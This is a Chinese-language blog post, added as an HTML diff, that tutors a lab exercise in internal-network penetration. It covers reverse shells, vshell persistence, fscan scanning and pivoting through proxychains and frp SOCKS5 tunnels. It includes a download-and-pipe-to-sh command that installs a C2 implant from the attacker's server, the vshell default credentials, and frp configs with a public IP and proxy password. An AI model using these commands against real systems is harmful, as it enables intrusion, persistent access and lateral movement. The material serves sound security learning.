@@ -1,0 +1,286 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>入门内网渗透实验一 | AnchorEureka' Blog</title><meta name="author" content="AnchorEureka"><meta name="copyright" content="AnchorEureka"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="实验目标熟悉内网渗透的基本流程，熟悉内网渗透时一些基本工具的实验，这个实验基于 Linux 。 环境搭建https:&#x2F;&#x2F;github.com&#x2F;justdoit-cai&#x2F;LAN-penetration-exp&#x2F;tree&#x2F;main&#x2F;LAN-penetration-exp1 获取暴露在外网的靶机的权限首先内网渗透的第一步肯定是要先利用外网程序的漏洞来反弹 shell 到自己公网的 vps 上，获取一台外">
+<meta property="og:type" content="article">
+<meta property="og:title" content="入门内网渗透实验一">
+<meta property="og:url" content="https://justdoittt.top/2024/04/01/%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%B8%80/index.html">
+<meta property="og:site_name" content="AnchorEureka&#39; Blog">
+<meta property="og:description" content="实验目标熟悉内网渗透的基本流程，熟悉内网渗透时一些基本工具的实验，这个实验基于 Linux 。 环境搭建https:&#x2F;&#x2F;github.com&#x2F;justdoit-cai&#x2F;LAN-penetration-exp&#x2F;tree&#x2F;main&#x2F;LAN-penetration-exp1 获取暴露在外网的靶机的权限首先内网渗透的第一步肯定是要先利用外网程序的漏洞来反弹 shell 到自己公网的 vps 上，获取一台外">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://justdoittt.top/img/bg3.jpg">
+<meta property="article:published_time" content="2024-03-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-04-01T13:46:47.776Z">
+<meta property="article:author" content="AnchorEureka">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://justdoittt.top/img/bg3.jpg"><link rel="shortcut icon" href="/img/bg4.jpg"><link rel="canonical" href="https://justdoittt.top/2024/04/01/%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%B8%80/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '入门内网渗透实验一',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-01 21:46:47'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/imgs/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bg3.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="AnchorEureka' Blog"><span class="site-name">AnchorEureka' Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">入门内网渗透实验一</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-31T16:00:00.000Z" title="发表于 2024-04-01 00:00:00">2024-04-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-01T13:46:47.776Z" title="更新于 2024-04-01 21:46:47">2024-04-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="入门内网渗透实验一"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h1><p>熟悉内网渗透的基本流程，熟悉内网渗透时一些基本工具的实验，这个实验基于 <code>Linux</code> 。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a target="_blank" rel="noopener" href="https://github.com/justdoit-cai/LAN-penetration-exp/tree/main/LAN-penetration-exp1">https://github.com/justdoit-cai/LAN-penetration-exp/tree/main/LAN-penetration-exp1</a></p>
+<h1 id="获取暴露在外网的靶机的权限"><a href="#获取暴露在外网的靶机的权限" class="headerlink" title="获取暴露在外网的靶机的权限"></a>获取暴露在外网的靶机的权限</h1><p>首先内网渗透的第一步肯定是要先利用外网程序的漏洞来反弹 <code>shell</code> 到自己公网的 <code>vps</code> 上，获取一台外网机器的权限。</p>
+<p><img src="/imgs/Pasted%20image%2020240401015613.png"></p>
+<p><img src="/imgs/Pasted%20image%2020240401015631.png"></p>
+<h1 id="持久化webshell"><a href="#持久化webshell" class="headerlink" title="持久化webshell"></a>持久化webshell</h1><p>一方面为了 <code>webshell</code> 的稳定性，另一方面为了避免程序的漏洞被修复导致我们无法再利用程序的漏洞获取外网靶机的 <code>webshell</code> ，我们需要上传后门到靶机上来持久化 <code>webshell</code> 。</p>
+<p>这里主要介绍几种持久化 <code>webshell</code> 的工具。</p>
+<h2 id="vshell"><a href="#vshell" class="headerlink" title="vshell"></a>vshell</h2><h3 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h3><p><a target="_blank" rel="noopener" href="https://github.com/veo/vshell">https://github.com/veo/vshell</a></p>
+<p>不过不幸的是，这个工具现在被封禁了，停止了更新并且也不给用了。</p>
+<p><img src="/imgs/Pasted%20image%2020240401020855.png"></p>
+<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>下载程序到自己的 <code>vps</code> 上，自己的 <code>vps</code> 要开放 <code>8082</code> （管理端口）和 <code>8084</code> （上线靶机端口）端口，然后直接启动程序即可。</p>
+<p><img src="/imgs/Pasted%20image%2020240401021042.png"></p>
+<p>这里管理页面的默认账号密码是 <code>admin/qwe123qwe</code> 。</p>
+<p>这里我们复制 <strong>客户端生成</strong> 页面的上线命令通过反弹 <code>shell</code> 在受控的靶机上执行，然后过一会就可以获取持久化的 <code>shell</code> 了。</p>
+<p><img src="/imgs/Pasted%20image%2020240401022722.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(curl -fsSL -m180 &lt;服务端地址&gt;:8084/slt||wget -T180 -q &lt;服务端地址&gt;:8084/slt)|sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/Pasted%20image%2020240401022500.png"></p>
+<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><h3 id="下载地址-1"><a href="#下载地址-1" class="headerlink" title="下载地址"></a>下载地址</h3><p><a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p>
+<h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><p>在靶机执行下面的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/shadow1ng/fscan/releases/download/1.8.3/fscan</span><br><span class="line">chmod a+x fscan</span><br><span class="line"># 获取受控靶机的内网ip</span><br><span class="line">ifconfig</span><br><span class="line">./fscan -h &lt;内网ip地址网段&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/Pasted%20image%2020240401024705.png"></p>
+<p>这里发现了 <code>172.18.0.2</code> 这台另外的内网主机，并且开放了 <code>8080</code> 端口。</p>
+<p><img src="/imgs/Pasted%20image%2020240401024721.png"></p>
+<h1 id="挂代理进内网"><a href="#挂代理进内网" class="headerlink" title="挂代理进内网"></a>挂代理进内网</h1><h2 id="vshell工具"><a href="#vshell工具" class="headerlink" title="vshell工具"></a>vshell工具</h2><p>前面用到过的 <code>vshell</code> 自身就支持一键开启代理，而且这个的操作很方便，因为 <code>vshell</code> 会自动帮我们搞好到靶机的代理，不需要我们自己手动操作靶机。</p>
+<p><img src="/imgs/Pasted%20image%2020240401025727.png"></p>
+<h2 id="隧道代理的使用方式"><a href="#隧道代理的使用方式" class="headerlink" title="隧道代理的使用方式"></a>隧道代理的使用方式</h2><p>这里在介绍下面一种代理工具前，我们先来学习一下怎么使用我们搭建好的 <strong>隧道代理</strong> ，这里以 <code>Socks5</code> 隧道代理为例。</p>
+<h3 id="proxychains工具"><a href="#proxychains工具" class="headerlink" title="proxychains工具"></a>proxychains工具</h3><p><code>proxychains &lt;待执行的命令&gt;</code> 命令可以指定某个待执行的命令在发起网络请求的时候使用我们 <code>proxychains</code> 使用的代理。这样我们在本地的 <code>kali</code> 对目标内网发起脚本程序攻击时，脚本程序可以连接的到目标内网。</p>
+<p><code>proxychains</code> 的配置文件在为 <code>/etc/proxychains.conf</code> 或者 <code>/etc/proxychains4.conf</code> 。我们配置代理只需要在这个文件的底部如下配置就可以了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 代理如果没有验证就可以不需要后面两个配置</span><br><span class="line">&lt;代理方式&gt;  &lt;代理ip&gt;  &lt;代理port&gt;  &lt;代理验证的用户名&gt;  &lt;代理验证的密码&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/Pasted%20image%2020240401035729.png"></p>
+<p><code>proxychains</code> 的使用方法如下：</p>
+<p>我们可以发现 <code>curl</code> 命令带了 <code>proxychains</code> 走代理就可以成功访问目标内网。</p>
+<p><img src="/imgs/Pasted%20image%2020240401035933.png"></p>
+<p>并且我们在 <code>kali</code> 中还可以使用 <code>proxychains</code> 来运行浏览器，这里在渗透内网的网站时就会更方便。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用代理运行firefox，这样就可以访问内网的页面了</span><br><span class="line">proxychains firefox</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/Pasted%20image%2020240401040258.png"></p>
+<h2 id="frp工具"><a href="#frp工具" class="headerlink" title="frp工具"></a>frp工具</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><code>frp</code> 是一个高性能的反向代理应用，支持 <code>tcp</code>, <code>udp</code>, <code>http</code>, <code>https</code> 协议。</p>
+<ul>
+<li>利用处于防火墙后的机器，对外网环境提供 <code>http</code> 或 <code>https</code> 服务。</li>
+<li>对于 <code>http</code> , <code>https</code> 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个 <code>80</code> 端口。</li>
+<li>利用处于防火墙后的机器，对外网环境提供 <code>tcp</code> 和 <code>udp</code> 服务，例如在家里通过 <code>ssh</code> 访问处于公司局部环境的主机。</li>
+</ul>
+<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ol>
+<li>服务端运行，监听一个主端口，等待客户端的连接；</li>
+<li>客户端连接到服务端的主端口，同时告诉服务端要监听的端口和转发类型；</li>
+<li>服务端 <code>fork</code> 新的进程监听客户端指定的端口；</li>
+<li>外网用户连接到客户端指定的端口，服务端通过和客户端的连接将数据转发到客户端；</li>
+<li>客户端进程再将数据转发到本地服务，从而实现内网对外暴露服务的能力。</li>
+</ol>
+<h3 id="下载地址-2"><a href="#下载地址-2" class="headerlink" title="下载地址"></a>下载地址</h3><p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
+<h3 id="使用方法-2"><a href="#使用方法-2" class="headerlink" title="使用方法"></a>使用方法</h3><blockquote>
+<p>老版本的 <code>frp</code> 使用的是 <code>ini</code> 配置文件，新版本的 <code>frp</code> 默认使用的是 <code>toml</code> 配置文件。最新版的配置文件格式参考： <a target="_blank" rel="noopener" href="https://dusays.com/636/">https://dusays.com/636/</a></p>
+</blockquote>
+<p>在自己的公网服务器上执行下面的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/fatedier/frp/releases/download/v0.56.0/frp_0.56.0_linux_amd64.tar.gz</span><br><span class="line">tar -zxvf frp_0.56.0_linux_amd64.tar.gz</span><br><span class="line">./frps -c frps.toml</span><br></pre></td></tr></table></figure>
+
+<p>下面两种方式的 <code>frps.toml</code> 的文件内容都如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bindPort = 10002</span><br></pre></td></tr></table></figure>
+
+<p>在靶机上执行上面相似的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/fatedier/frp/releases/download/v0.56.0/frp_0.56.0_linux_amd64.tar.gz</span><br><span class="line">tar -zxvf frp_0.56.0_linux_amd64.tar.gz</span><br><span class="line">./frpc -c frpc.toml</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法一：传统代理配置"><a href="#方法一：传统代理配置" class="headerlink" title="方法一：传统代理配置"></a>方法一：传统代理配置</h4><p><code>frpc.toml</code> 的文件内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;43.139.58.138&quot;</span><br><span class="line">serverPort = 10002</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;test&quot;</span><br><span class="line">type = &quot;tcp&quot;</span><br><span class="line">localIP = &quot;172.18.0.2&quot;</span><br><span class="line">localPort = 8080</span><br><span class="line">remotePort = 10001</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>其中 <code>server</code> 端的 <code>bindPort</code> 对应 <code>client</code> 端的 <code>serverPort</code> ，注意这个端口是它们两个的数据通信端口，而非我们访问的端口。上面的文件内容表示我们对公网 <code>43.139.58.138:10001</code> 地址发过去的 <code>tcp</code> 数据会被转发到内网的 <code>172.18.0.2:8080</code> 处。</p>
+</blockquote>
+<p>注意这里在访问内网的时候需要通过公网的 <code>ip</code> 地址来访问。</p>
+<p><img src="/imgs/Pasted%20image%2020240401044723.png"></p>
+<h4 id="方法二：socks5隧道代理配置"><a href="#方法二：socks5隧道代理配置" class="headerlink" title="方法二：socks5隧道代理配置"></a>方法二：socks5隧道代理配置</h4><p>按照 <code>frp</code> 本身的工作原理是使用的传统代理配置，但是 <code>frp</code> 也提供了插件来搭建隧道代理，使用方式如下。</p>
+<p><code>frpc.toml</code> 的文件内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">serverAddr = &quot;43.139.58.138&quot;</span><br><span class="line">serverPort = 10002</span><br><span class="line"></span><br><span class="line">[[proxies]]</span><br><span class="line">name = &quot;plugin_socks5&quot;</span><br><span class="line">type = &quot;tcp&quot;</span><br><span class="line">remotePort = 10001</span><br><span class="line">[proxies.plugin]</span><br><span class="line">type = &quot;socks5&quot;</span><br><span class="line">username = &quot;anchor&quot;</span><br><span class="line">password = &quot;justdoit123&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后启动两端后使用的方式和前面的 <code>vshell</code> 代理一样，使用内网 <code>ip</code> 地址来访问。</p>
+<h2 id="传统代理和隧道代理的区别"><a href="#传统代理和隧道代理的区别" class="headerlink" title="传统代理和隧道代理的区别"></a>传统代理和隧道代理的区别</h2><p>隧道代理（ <code>Tunnel Proxy</code> ）是一种特殊的代理服务，它允许用户通过固定的本地 <code>IP</code> 和端口访问互联网。在这个过程中，云端服务器负责 <strong>自动切换</strong>  <code>IP</code> 地址，从而实现 <strong>匿名访问</strong> 。通过隧道代理，用户可以绕过网络审查，保护网络通讯安全，以及隐藏用户身份。</p>
+<p>隧道代理的工作原理相对简单。当您通过隧道代理访问互联网时，本地计算机将请求发送到代理服务器。代理服务器接收到请求后，会使用其 <strong>自身的 <code>IP</code> 地址与目标服务器建立连接</strong> 。在数据传输过程中，代理服务器会自动更换 <code>IP</code> 地址，确保用户的真实 <code>IP</code> 地址不被泄露。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="https://github.com/justdoit-cai">AnchorEureka</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://justdoittt.top/2024/04/01/%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%B8%80/">https://justdoittt.top/2024/04/01/%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%B8%80/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://justdoittt.top" target="_blank">AnchorEureka' Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div class="post_share"><div class="social-share" data-image="/img/bg3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/" title="Thymeleaf漏洞汇总"><img class="cover" src="/img/bg10.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Thymeleaf漏洞汇总</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/imgs/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">AnchorEureka</div><div class="author-info__description">just do it!</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/justdoit-cai"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/justdoit-cai" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2068830937@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">大家一起冲冲冲!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E6%A0%87"><span class="toc-number">1.</span> <span class="toc-text">实验目标</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9A%B4%E9%9C%B2%E5%9C%A8%E5%A4%96%E7%BD%91%E7%9A%84%E9%9D%B6%E6%9C%BA%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">3.</span> <span class="toc-text">获取暴露在外网的靶机的权限</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96webshell"><span class="toc-number">4.</span> <span class="toc-text">持久化webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#vshell"><span class="toc-number">4.1.</span> <span class="toc-text">vshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80"><span class="toc-number">4.1.1.</span> <span class="toc-text">下载地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.2.</span> <span class="toc-text">使用方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">5.</span> <span class="toc-text">内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#fscan"><span class="toc-number">5.1.</span> <span class="toc-text">fscan</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80-1"><span class="toc-number">5.1.1.</span> <span class="toc-text">下载地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-1"><span class="toc-number">5.1.2.</span> <span class="toc-text">使用方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8C%82%E4%BB%A3%E7%90%86%E8%BF%9B%E5%86%85%E7%BD%91"><span class="toc-number">6.</span> <span class="toc-text">挂代理进内网</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 